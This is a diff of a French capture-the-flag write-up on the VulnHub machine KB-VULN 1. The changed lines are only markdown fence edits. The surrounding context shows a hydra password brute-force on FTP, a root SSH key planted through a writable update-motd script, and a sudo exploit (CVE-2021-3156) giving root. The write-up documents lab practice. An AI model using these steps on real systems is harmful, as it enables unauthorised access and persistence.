@@ -10,7 +10,7 @@ Combien de temps faut-il pour résoudre un CTF ? Tout dépend bien sûr de la di
 
 Pour celui-ci ([KB-VULN n°1](https://www.vulnhub.com/entry/kb-vuln-1,540/)) on est bien plus près des minutes que des heures, il n'en reste pas moins qu'on peut s'amuser (vite fait).  
 
-```plain
+```
 Nmap scan report for 192.168.56.5
 Host is up (0.00015s latency).
 Not shown: 65532 closed tcp ports (reset)
@@ -52,7 +52,7 @@ Une énumération de la racine web ne remonte rien, mais un coup d'œil à la so
 
 Aussitôt dit, aussitôt cracké :  
 
-```plain
+```
 $ ./hydra -l sysadmin -P rockyou.txt -e nsr ftp://192.168.56.5
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -64,14 +64,14 @@ Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in mi
 
 Cet identifiant permet l'accès au FTP mais surtout au SSH où l'on retrouve un premier flag.  
 
-```plain
+```
 sysadmin@kb-server:~$ cat user.txt 
 48a365b4ce1e322a55ae9017f3daf0c0
 ```
 
 Cet utilisateur fait partie des groupes sudo et lxd :  
 
-```plain
+```
 uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 ```
 
@@ -79,7 +79,7 @@ Un petit coup de LinPEAS indique que le fichier */etc/update-motd.d/00-header* a
 
 D'après [la page de manuel](https://manpages.ubuntu.com/manpages/bionic/man5/update-motd.5.html) :  
 
-```plain
+```
 Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
 each  login,  and  this  information  is  concatenated in /run/motd.dynamic.
 ```
@@ -123,7 +123,7 @@ echo 'ssh-rsa --ma-cle-publique-ssh--' > /root/.ssh/authorized_keys
 
 Et effectivement si je me reconnecte :  
 
-```plain
+```
 $ ssh sysadmin@192.168.56.5
 sysadmin@192.168.56.5's password: 
 
@@ -134,14 +134,14 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Ce qui prouve que le script a été exécuté en root et que je me suis rajouté un accès.  
 
-```plain
+```
 root@kb-server:~# cat flag.txt 
 1eedddf9fff436e6648b5e51cb0d2ec7
 ```
 
 On peut aussi obtenir l'accès root via [l'exploit pour sudo](https://github.com/worawit/CVE-2021-3156) utilisé sur le précédent CTF (Fawkes) :  
 
-```plain
+```
 sysadmin@kb-server:~/CVE-2021-3156-main$ python3 exploit_nss.py
 # id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(sysadmin)
